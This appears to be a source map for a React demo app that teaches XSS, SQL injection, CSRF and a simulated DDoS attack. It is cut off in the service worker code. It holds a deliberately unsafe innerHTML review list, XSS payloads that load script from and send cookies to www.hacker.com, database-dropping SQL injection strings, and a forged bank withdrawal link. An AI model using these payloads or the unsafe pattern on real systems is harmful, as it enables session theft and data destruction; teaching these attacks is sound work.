{"version":3,"sources":["pages/XSS/db.js","utils/utils.js","pages/XSS/XSS.js","pages/XSS/codes.js","pages/SQLInject/db.js","pages/SQLInject/SQLInject.js","pages/SQLInject/codes.js","pages/CSRF/CSRF.js","pages/DDoS/DDoS.js","pages/DDoS/serverConsole.js","App.js","serviceWorker.js","index.js"],"names":["db","key","id","content","columns","title","dataIndex","highlight","document","querySelectorAll","forEach","codePad","hljs","highlightBlock","Search","Input","XSS","props","_this","Object","classCallCheck","this","possibleConstructorReturn","getPrototypeOf","call","onAddReview","review","state","setState","concat","toConsumableArray","length","updateReviewList","reviewList","querySelector","innerHTML","reviewItem","liItem","createElement","appendChild","getFrontendCodes","html","prevProps","prevState","snapshot","react_default","a","style","textAlign","row","gutter","type","justify","col","span","divider","placeholder","onSearch","enterButton","className","table","dataSource","Component","name","age","SQLInject","onAttackSearch","value","addLogs","keyword","logs","sql","SQLInject_Search","map","log","CSRF","openNotification","Date","now","btn","href","notification","open","message","description","onLogin","account","password","isLogin","error","_this2","_this$state","es_form","Item","input","prefix","icon","onChange","event","target","es_button","onClick","block","DDoS","startAttack","timeId","setInterval","stopAttack","window","clearInterval","getRandomByte","Math","round","random","getRandomPort","getRandomIp","fin","padEnd","App","current","onChangeMenu","e","react_router_dom","menu","selectedKeys","mode","to","react_router","path","exact","component","Boolean","location","hostname","match","ReactDOM","render","src_App_0","getElementById","navigator","serviceWorker","ready","then","registration","unregister"],"mappings":"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","file":"static/js/main.ad434574.chunk.js","sourcesContent":["export const db = [{\n    key: '1',\n    id: '1',\n    content: 'A nice movie',\n}, {\n    key: '2',\n    id: '2',\n    content: 'That movie is so fun',\n}]\n\nexport const columns = [{\n    title: 'review_id',\n    dataIndex: 'id',\n    key: 'id',\n}, {\n    title: 'review_content',\n    dataIndex: 'content',\n    key: 'content',\n}];\n","import hljs from 'highlight.js'\n\nexport const highlight = () => {\n    const codePads = document.querySelectorAll('pre code')\n    codePads.forEach(codePad => hljs.highlightBlock(codePad))\n}\n","import React, {Component} from 'react'\nimport {Col, Divider, Input, Row, Table} from \"antd\"\nimport {columns, db} from './db'\nimport {alertCode, outsideCode, stealCookie} from \"./codes\"\nimport {highlight} from \"../../utils/utils\"\n\nconst Search = Input.Search\n\nclass XSS extends Component {\n    constructor(props) {\n        super(props)\n        this.state = { db }\n    }\n\n    componentDidMount() {\n        this.updateReviewList()\n        highlight()\n    }\n\n    componentDidUpdate(prevProps, prevState, snapshot) {\n        this.updateReviewList()\n        highlight()\n    }\n\n    onAddReview = (review) => {\n        const {db} = this.state\n        this.setState({\n            db: [...db, {\n                key: db.length + 1,\n                id: db.length + 1,\n                content: review\n            }]\n        })\n    }\n\n    updateReviewList = () => {\n        const {db} = this.state\n        const reviewList = document.querySelector('#review-list')\n        reviewList.innerHTML = ''\n\n        db.forEach(reviewItem => {\n            const liItem = document.createElement('li')\n            liItem.innerHTML = reviewItem.content\n\n            reviewList.appendChild(liItem)\n        })\n    }\n\n    getFrontendCodes = () => {\n        let html = `<ul>\\n`\n        this.state.db.forEach(reviewItem => html += `    <li>${reviewItem.content}</li>\\n`)\n        html += '</ul>'\n        return html\n    }\n\n    render() {\n        const {db} = this.state\n        return (\n            <div>\n                <h1 style={{textAlign: 'center'}}>Review Module (XSS Attack)</h1>\n                <Row gutter={16} type=\"flex\" justify=\"center\">\n                    {/*Left*/}\n                    <Col span={8}>\n                        <Divider>Frontend</Divider>\n                        <h3>Review List</h3>\n                        {/*Add review input*/}\n                        <Search\n                            placeholder=\"Enter a movie review\"\n                            onSearch={this.onAddReview}\n                            enterButton=\"Add Review\"\n                        />\n\n                        {/*Review list*/}\n                        <ul id=\"review-list\"/>\n\n                        {/*Frontend Codes*/}\n                        <Divider>Frontend Codes</Divider>\n                        <pre>\n                            <code className=\"html\">\n                                {this.getFrontendCodes()}\n                            </code>\n                        </pre>\n\n                        {/*Tips*/}\n                        <Divider>Tips</Divider>\n                        <p>Try following keyword to break the frontend</p>\n                        <ul>\n                            <li>{alertCode}</li>\n                            <li>{outsideCode}</li>\n                            <li>{stealCookie}</li>\n                        </ul>\n                    </Col>\n                    {/*Right*/}\n                    <Col span={8}>\n                        <Divider>Backend: 'review' Database</Divider>\n                        <Table dataSource={db} columns={columns}/>\n                    </Col>\n                </Row>\n            </div>\n        )\n    }\n}\n\nexport default XSS\n","export const alertCode = `<script>alert(\"You are hack!\")</script>`\nexport const outsideCode = `<script src=\"www.hacker.com/main.js\"></script>`\nexport const stealCookie = `<script>sendHTTPRequest(\"www.hacker.com\", document.cookie)</script>`\n","export const db = [{\n    key: '1',\n    name: 'Jack',\n    age: 32,\n}, {\n    key: '2',\n    name: 'Tom',\n    age: 42,\n}, {\n    key: '3',\n    name: 'Jerry',\n    age: 12,\n}]\n\nexport const columns = [{\n    title: 'user_name',\n    dataIndex: 'name',\n    key: 'name',\n}, {\n    title: 'user_age',\n    dataIndex: 'age',\n    key: 'age',\n}];\n","import React, {Component} from 'react'\nimport {Col, Divider, Input, Row, Table} from 'antd'\nimport {columns, db} from \"./db\"\nimport {readySqlCodes} from \"./codes\"\nimport './styles.css'\nimport {highlight} from \"../../utils/utils\"\n\nconst Search = Input.Search\n\nclass SQLInject extends Component {\n    constructor(props) {\n        super(props)\n        this.state = {\n            logs: []\n        }\n    }\n\n    componentDidMount() {\n        highlight()\n    }\n\n    componentDidUpdate(prevProps, prevState, snapshot) {\n        highlight()\n    }\n\n    onAttackSearch = (value) => {\n        this.addLogs(value)\n    }\n\n    addLogs = (keyword) => {\n        const {logs} = this.state\n        const sql = `\nselect * from user where user_name = '${keyword}'`\n        this.setState({\n            logs: [ ...logs, sql]\n        })\n    }\n\n    render() {\n        const {logs} = this.state\n        return (\n          <div>\n              <h1 style={{textAlign: 'center'}}>User Module (SQL Inject Attack)</h1>\n              <Row gutter={16} type=\"flex\" justify=\"center\">\n                  {/*Left*/}\n                  <Col span={8}>\n                      <Divider>Frontend</Divider>\n                      <h3>Enter user name for searching user</h3>\n                      <Search\n                        placeholder=\"Enter user name\"\n                        onSearch={this.onAttackSearch}\n                        enterButton=\"Search User\"\n                      />\n                      <Divider>Tips</Divider>\n                      <p>Try following keyword to break the database</p>\n                      <ul>\n                          <li>'; drop database 'user</li>\n                          <li>'; delete user where '1' = '1</li>\n                      </ul>\n                  </Col>\n                  {/*Right*/}\n                  <Col span={8}>\n                      <Divider>Backend: 'user' Database</Divider>\n                      <Table dataSource={db} columns={columns}/>\n                      <Divider>SQL Logger</Divider>\n                      <pre>\n                        <code className=\"sql\">\n                            {readySqlCodes}\n                            {logs.map(log => `\\n${log}`)}\n                        </code>\n                    </pre>\n                  </Col>\n              </Row>\n          </div>\n        )\n    }\n}\n\nexport default SQLInject\n","export const readySqlCodes = `Loading Database...\nData base loaded...\n\nEnter user name to make a query...`\n","import React, {Component} from 'react'\nimport {Button, Col, Divider, Form, Icon, Input, notification, Row, message} from \"antd\"\n\nclass CSRF extends Component {\n    constructor(props) {\n        super(props)\n        this.state = {\n            isLogin: false,\n            account: '',\n            password: ''\n        }\n    }\n\n    openNotification = () => {\n        const key = `open${Date.now()}`\n        const btn = (\n            <a href=\"#\">http://bank.example/withdraw?account=Bob&amount=1000000&for=Evil</a>\n        )\n        notification.open({\n            message: 'Hacker Message',\n            description: 'Click the link below to see something new XD',\n            btn,\n            key,\n        })\n    }\n\n    onLogin = () => {\n        if (this.state.account !== 'Bob' || this.state.password !== '123') {\n            message.error(\"Invalid account or password\")\n            return\n        }\n\n        this.setState({\n            isLogin: true\n        })\n\n        this.openNotification()\n    }\n\n    render() {\n        const {isLogin, account, password} = this.state\n        return (\n            <div>\n                <h1 style={{textAlign: 'center'}}>Login Module (CSRF Attack)</h1>\n                <Row gutter={16} type=\"flex\" justify=\"center\">\n                    {/*Left*/}\n                    <Col span={8}>\n                        <Divider>Frontend</Divider>\n                        <h3>Review List</h3>\n                        {\n                            isLogin ?\n                                <div>You are logged in</div>\n                                :\n                                <Form className=\"login-form\">\n                                    <Form.Item>\n                                        <Input\n                                            value={account}\n                                            prefix={<Icon type=\"user\"/>}\n                                            placeholder=\"Bob is the account\"\n                                            onChange={event => this.setState({account: event.target.value})}\n                                        />\n                                    </Form.Item>\n                                    <Form.Item>\n                                        <Input\n                                            value={password}\n                                            prefix={<Icon type=\"lock\"/>}\n                                            type=\"password\"\n                                            placeholder=\"123 is the password\"\n                                            onChange={event => this.setState({password: event.target.value})}\n                                        />\n                                    </Form.Item>\n                                    <Form.Item>\n                                        <Button onClick={this.onLogin} type=\"primary\" block\n                                                className=\"login-form-button\">\n                                            Log in\n                                        </Button>\n                                    </Form.Item>\n                                </Form>\n                        }\n\n                        {/*Tips*/}\n                        <Divider>Tips</Divider>\n                        <p>Try following keyword to break the frontend</p>\n                        <ol>\n                            <li>Login with any email and password</li>\n                            <li>Click the link that user sends</li>\n                            <li>Boom, your account has been stolen 300 bucks</li>\n                        </ol>\n                    </Col>\n                </Row>\n            </div>\n        )\n    }\n}\n\nexport default CSRF\n","import React, {Component} from \"react\"\nimport {readyServerCodes} from \"./serverConsole\"\nimport {Button, Col, Divider, Row} from \"antd\"\nimport {highlight} from \"../../utils/utils\"\n\n\nclass DDoS extends Component {\n    constructor(props) {\n        super(props)\n        this.state = {\n            timeId: 0,\n            logs: []\n        }\n    }\n\n    componentDidMount() {\n        highlight()\n    }\n\n    startAttack = () => {\n        const timeId = setInterval(() => {\n                this.addLogs()\n        }, 1000)\n        this.setState({ timeId })\n    }\n\n    stopAttack = () => {\n        window.clearInterval(this.state.timeId)\n    }\n\n    getRandomByte = () => {\n        return Math.round(Math.random()*256)\n    }\n\n    getRandomPort = () => {\n        return Math.round(Math.random()*50000) + 3000\n    }\n\n    getRandomIp = () => {\n        var ip = this.getRandomByte() +'.' +\n            this.getRandomByte() +'.' +\n            this.getRandomByte() +'.' +\n            this.getRandomByte()\n        return ip\n    }\n\n    addLogs = () => {\n        const {logs} = this.state\n        const serverConsole = `tcp    0    0    ${this.getRandomIp()}:${this.getRandomPort()}\\tSYN_RECV`\n        const fin = serverConsole.padEnd(40)\n        this.setState({\n            logs: [ ...logs, fin]\n        })\n    }\n\n    render() {\n        const {logs} = this.state\n        return (\n            <div>\n                <h1 style={{textAlign: 'center'}}>Server Module(DDos attack)</h1>\n                <Row gutter={16} type=\"flex\" justify=\"center\">\n                    {/*Left*/}\n                    <Col span={8}>\n                        <Divider>Frontend</Divider>\n                        <h3>Press the button to start DDos attack</h3>\n                        <Button onClick={this.startAttack} type=\"primary\" block>\n                            Start DDos Attack\n                        </Button>\n                        <Divider/>\n                        <Button onClick={this.stopAttack} type=\"primary\" block>\n                            Stop DDos Attack\n                        </Button>\n                    </Col>\n                    {/*Right*/}\n                    <Col span={12}>\n                        <Divider>Backend: Server Console</Divider>\n                        <pre>\n                        <code className=\"server\">\n                            {readyServerCodes}\n                            {logs.map(log => `\\n${log}`)}\n                        </code>\n                    </pre>\n                    </Col>\n                </Row>\n            </div>\n        )\n    }\n}\n\nexport default DDoS\n","export const readyServerCodes = `Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.15.0-47-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\nLast login: Wed May 15 21:34:11 2019 from 111.22.33.4\nalice@dev:~$ netstat -pantu | grep SYN`\n","import React, {Component} from 'react'\nimport {HashRouter as Router, Link, Route} from \"react-router-dom\"\nimport {Menu} from 'antd'\nimport './App.css'\nimport 'highlight.js/styles/atom-one-dark.css'\nimport XSS from './pages/XSS/XSS'\nimport SQLInject from \"./pages/SQLInject/SQLInject\"\nimport CSRF from \"./pages/CSRF/CSRF\"\nimport DDoS from \"./pages/DDoS/DDoS\"\n\nclass App extends Component {\n    state = {\n        current: 'xss',\n    }\n\n    onChangeMenu = (e) => {\n        this.setState({\n            current: e.key,\n        });\n    }\n\n    render() {\n        return (\n            <Router className=\"App\">\n                <Menu\n                    className=\"app-menu\"\n                    onClick={this.onChangeMenu}\n                    selectedKeys={[this.state.current]}\n                    mode=\"horizontal\">\n                    <Menu.Item key=\"xss\">\n                        <Link to=\"/\">XSS</Link>\n                    </Menu.Item>\n                    <Menu.Item key=\"sql-inject\">\n                        <Link to=\"/sql-inject\">SQL Inject</Link>\n                    </Menu.Item>\n                    <Menu.Item key=\"csrf\">\n                        <Link to=\"/csrf\">CSRF</Link>\n                    </Menu.Item>\n                    <Menu.Item key=\"ddos\">\n                        <Link to=\"/ddos\">DDoS</Link>\n                    </Menu.Item>\n                </Menu>\n                <div className=\"app-content\">\n                    <Route path=\"/\" exact component={XSS}/>\n                    <Route path=\"/sql-inject\" component={SQLInject}/>\n                    <Route path=\"/csrf\" component={CSRF}/>\n                    <Route path=\"/ddos\" component={DDoS}/>\n                </div>\n            </Router>\n        )\n    }\n}\n\nexport default App\n","// This optional code is used to register a service worker.\n// register() is not called by default.\n\n// This lets the app load faster on subsequent visits in production, and gives\n// it offline capabilities. However, it also means that developers (and users)\n// will only see deployed updates on subsequent visits to a page, after all the\n// existing tabs open on the page have been closed, since previously cached\n// resources are updated in the background.\n\n// To learn more about the benefits of this model and instructions on how to\n// opt-in, read https://bit.ly/CRA-PWA\n\nconst isLocalhost = Boolean(\n  window.location.hostname === 'localhost' ||\n    // [::1] is the IPv6 localhost address.\n    window.location.hostname === '[::1]' ||\n    // 127.0.0.1/8 is considered localhost for IPv4.\n    window.location.hostname.match(\n      /^127(?:\\.(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)){3}$/\n    )\n);\n\nexport function register(config) {\n  if (process.env.NODE_ENV === 'production' && 'serviceWorker' in navigator) {\n    // The URL constructor is available in all browsers that support SW.\n    const publicUrl = new URL(process.env.PUBLIC_URL, window.location.href);\n    if (publicUrl.origin !== window.location.origin) {\n      // Our service worker won't work if PUBLIC_URL is on a different origin\n      // from what our page is served on. This might happen if a CDN is used to\n      // serve assets; see https://github.com/facebook/create-react-app/issues/2374\n      return;\n    }\n\n    window.addEventListener('load', () => {\n      const swUrl = `${process.env.PUBLIC_URL}/service-worker.js`;\n\n      if (isLocalhost) {\n        // This is running on localhost. Let's check if a service worker still exists or not.\n        checkValidServiceWorker(swUrl, config);\n\n        // Add some additional logging to localhost, pointing developers to the\n        // service worker/PWA documentation.\n        navigator.serviceWorker.ready.then(() => {\n          console.log(\n            'This web app is being served cache-first by a service ' +\n              'worker. To learn more, visit https://bit.ly/CRA-PWA'\n          );\n        });\n      } else {\n        // Is not localhost. Just register service worker\n        registerValidSW(swUrl, config);\n      }\n    });\n  }\n}\n\nfunction registerValidSW(swUrl, config) {\n  navigator.serviceWorker\n    .register(swUrl)\n    .then(registration => {\n      registration.onupdatefound = () => {\n        const installingWorker = registration.installing;\n        if (installingWorker == null) {\n          